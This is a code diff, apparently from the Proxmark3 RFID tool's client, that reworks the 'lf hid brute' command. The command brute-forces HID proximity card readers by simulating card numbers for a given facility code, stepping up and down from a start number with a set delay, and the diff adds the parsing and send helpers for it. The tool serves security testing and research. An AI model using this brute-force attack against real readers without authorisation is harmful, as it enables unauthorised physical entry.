@@ -51,17 +51,49 @@ int usage_lf_hid_clone(void){
 }
 int usage_lf_hid_brute(void){
 	PrintAndLog("Enables bruteforce of HID readers with specified facility code.");
-	PrintAndLog("Different formatlength is supported");
-	PrintAndLog("This is a incremental attack against reader.");
+	PrintAndLog("This is a attack against reader. if cardnumber is given, it starts with it and goes up / down one step");
+	PrintAndLog("if cardnumber is not given, it starts with 1 and goes up to 65535");
 	PrintAndLog("");
-	PrintAndLog("Usage:  lf hid brute [h] <format length> <facility code>");
+	PrintAndLog("Usage:  lf hid brute [h] a <format> f <facility-code> c <cardnumber> d <delay>");
 	PrintAndLog("Options :");
-	PrintAndLog("  h				- This help");	
-	PrintAndLog("  <format length>	- 26|33|34|35|37|40|44|84");
-	PrintAndLog("  <facility code>	- 8-bit value HID facility code");
+	PrintAndLog("       h                 :  This help");	
+	PrintAndLog("       a <format>        :  26|33|34|35|37|40|44|84");
+	PrintAndLog("       f <facility-code> :  8-bit value HID facility code");
+	PrintAndLog("       c <cardnumber>    :  (optional) cardnumber to start with, max 65535");
+	PrintAndLog("       d <delay>         :  delay betweens attempts in ms. Default 1000ms");
 	PrintAndLog("");
-	PrintAndLog("Sample  : lf hid brute 26 224");
+	PrintAndLog("Samples:");
+	PrintAndLog("       lf hid brute a 26 f 224");
+	PrintAndLog("       lf hid brute a 26 f 21 d 2000");
+	PrintAndLog("       lf hid brute a 26 f 21 c 200 d 2000");
 	return 0;
+}
+
+static int sendPing(void){
+	UsbCommand ping = {CMD_PING, {1, 2, 3}};
+	SendCommand(&ping);
+	SendCommand(&ping);	
+	SendCommand(&ping);	
+	clearCommandBuffer();
+	UsbCommand resp;
+	if (WaitForResponseTimeout(CMD_ACK, &resp, 1000))
+		return 0;
+	return 1;
+}
+static bool sendTry(uint8_t fmtlen, uint32_t fc, uint32_t cn, uint32_t delay, uint8_t *bs){
+
+	PrintAndLog("Trying FC: %u; CN: %u", fc, cn);
+	
+	calcWiegand( fmtlen, fc, cn, bs);
+
+	uint64_t arg1 = bytebits_to_byte(bs,32);
+	uint64_t arg2 = bytebits_to_byte(bs+32,32);
+	UsbCommand c = {CMD_HID_SIM_TAG, {arg1, arg2, 0}}; 
+	clearCommandBuffer();
+	SendCommand(&c);
+	msleep(delay);
+	sendPing();
+	return TRUE;
 }
 
 int CmdHIDDemodFSK(const char *Cmd) {
@@ -273,7 +305,7 @@ void calc26(uint16_t fc, uint32_t cardno, uint8_t *out){
 	// *hi = (cardno >> 31);  
 // }
 
-static void calcWiegand(uint8_t fmtlen, uint16_t fc, uint64_t cardno, uint8_t *bits){
+void calcWiegand(uint8_t fmtlen, uint16_t fc, uint64_t cardno, uint8_t *bits){
 
 	// uint32_t hi = 0, lo = 0;
 	// uint32_t cn32 = (cardno & 0xFFFFFFFF);
@@ -359,67 +391,96 @@ int CmdHIDWiegand(const char *Cmd) {
 
 int CmdHIDBrute(const char *Cmd){
 	
-	bool error = TRUE;
-	uint8_t fc = 0, fmtlen = 0;
-
+	bool errors = false;
+	uint32_t fc = 0, cn = 0, delay = 1000;
+	uint8_t fmtlen = 0;
 	uint8_t bits[96];
 	uint8_t *bs = bits;
 	memset(bs, 0, sizeof(bits));
-
-	UsbCommand c = {CMD_HID_SIM_TAG, {0, 0, 0}};  
-	
-	char cmdp = param_getchar(Cmd, 0);
-	if (strlen(Cmd) > 2 || strlen(Cmd) == 0 || cmdp == 'h' || cmdp == 'H') return usage_lf_hid_brute();
-
-	fmtlen = param_get8(Cmd, 0);
-	uint8_t ftms[] = {26,33,34,35,37};
-	for ( uint8_t i = 0; i < sizeof(ftms); i++){
-		if ( ftms[i] == fmtlen ) {
-			error = FALSE;
+	uint8_t cmdp = 0;
+		
+	while(param_getchar(Cmd, cmdp) != 0x00 && !errors) {
+		switch(param_getchar(Cmd, cmdp)) {
+		case 'h':
+		case 'H':
+			return usage_lf_hid_brute();
+		case 'f':
+		case 'F':
+		  	fc =  param_get32ex(Cmd ,cmdp+1, 0, 10);
+			if ( !fc )
+				errors = true;
+			cmdp += 2;
+			break;
+		case 'd':
+		case 'D':
+			// delay between attemps,  defaults to 1000ms. 
+			delay = param_get32ex(Cmd, cmdp+1, 1000, 10);
+			cmdp += 2;
+			break;
+		case 'c':
+		case 'C':
+			cn = param_get32ex(Cmd, cmdp+1, 0, 10);
+			// truncate cardnumber.
+			cn &= 0xFFFF;
+			cmdp += 2;
+			break;
+		case 'a':
+		case 'A':
+			fmtlen = param_get8(Cmd, cmdp+1);			
+			cmdp += 2;
+			uint8_t ftms[] = {26,33,34,35,37};
+			for ( uint8_t i = 0; i < sizeof(ftms); i++){
+				if ( ftms[i] == fmtlen ) {
+					errors = FALSE;
+				}
+			}
+			break;
+		default:
+			PrintAndLog("Unknown parameter '%c'", param_getchar(Cmd, cmdp));
+			errors = true;
+			break;
 		}
 	}
-
-	if ( error ) return usage_lf_hid_brute();
-	
-  	fc =  param_get8(Cmd, 1);
-	if ( fc == 0) return usage_lf_hid_brute();
+	if ( fc == 0 ) errors = true;
+	if ( errors ) return usage_lf_hid_brute();
 	
 	PrintAndLog("Brute-forcing HID reader");
 	PrintAndLog("Press pm3-button to abort simulation or run another command");
-
-	for ( uint16_t cn = 1; cn < 0xFFFF; ++cn){
+	
+	uint16_t up = cn;
+	uint16_t down = cn;
+	
+	for (;;){
+		
+		if ( offline ) {
+			printf("Device offline\n");
+			return  2;
+		}
+		
 		if (ukbhit()) {
 			PrintAndLog("aborted via keyboard!");
-			c.cmd = CMD_PING;
-			c.arg[0] = 0x00;
-			c.arg[1] = 0x00;
-			c.arg[2] = 0x00;
-			clearCommandBuffer();
-			SendCommand(&c);
-			return 1;
+			return sendPing();
 		}
-
-		calcWiegand( fmtlen, fc, cn, bs);
-
-		c.arg[0] = bytebits_to_byte(bs,32);
-		c.arg[1] = bytebits_to_byte(bs+32,32);
-		clearCommandBuffer();
-		SendCommand(&c);
 		
-		PrintAndLog("Trying FC: %u; CN: %u", fc, cn);
-		// pause
-		sleep(1);
+		// Do one up
+		if ( up < 0xFFFF )
+			if ( !sendTry(fmtlen, fc, up++, delay, bs)) return 1;
+		
+		// Do one down  (if cardnumber is given)
+		if ( cn > 1 )
+			if ( down > 1 )
+				if ( !sendTry(fmtlen, fc, --down, delay, bs)) return 1;
 	}
 	return 0;
 }
 
 static command_t CommandTable[] = {
 	{"help",    CmdHelp,        1, "This help"},
-	{"fskdemod",CmdHIDDemodFSK, 0, "[1] Realtime HID FSK demodulator (option '1' for one tag only)"},
-	{"sim",     CmdHIDSim,      0, "<ID> -- HID tag simulator"},
-	{"clone",   CmdHIDClone,    0, "<ID> [L] -- Clone HID to T55x7"},
-	{"wiegand", CmdHIDWiegand,  0, "<OEM> <facility code> <card number> -- convert facility code/card number to Wiegand code"},
-	{"brute",   CmdHIDBrute, 0, "<format length> <facility code> -- brute force card number"},
+	{"fskdemod",CmdHIDDemodFSK, 0, "Realtime HID FSK demodulator"},
+	{"sim",     CmdHIDSim,      0, "HID tag simulator"},
+	{"clone",   CmdHIDClone,    0, "Clone HID to T55x7"},
+	{"wiegand", CmdHIDWiegand,  0, "Convert facility code/card number to Wiegand code"},
+	{"brute",   CmdHIDBrute,	0, "Bruteforce card number against reader"},
 	{NULL, NULL, 0, NULL}
 };
 
